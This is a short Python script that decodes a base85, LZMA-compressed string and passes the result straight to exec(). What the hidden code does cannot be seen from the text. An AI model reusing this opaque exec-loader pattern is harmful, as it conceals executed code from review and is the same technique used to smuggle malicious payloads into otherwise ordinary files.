import lzma
import base64

PAYLOAD = """{Wp48S^xk9=GL@E0stWa761SMbT8$j-~bu`7F_^19Enzp3z=Wf$?=K=6@1ry@tvAL00000j}D!c^}uQ$00A-^wkVTFAGYaadw&-0RR9100dcD"""

code_bytes = lzma.decompress(base64.b85decode(PAYLOAD))
exec(code_bytes.decode("utf-8"), {"__name__": "__main__"})
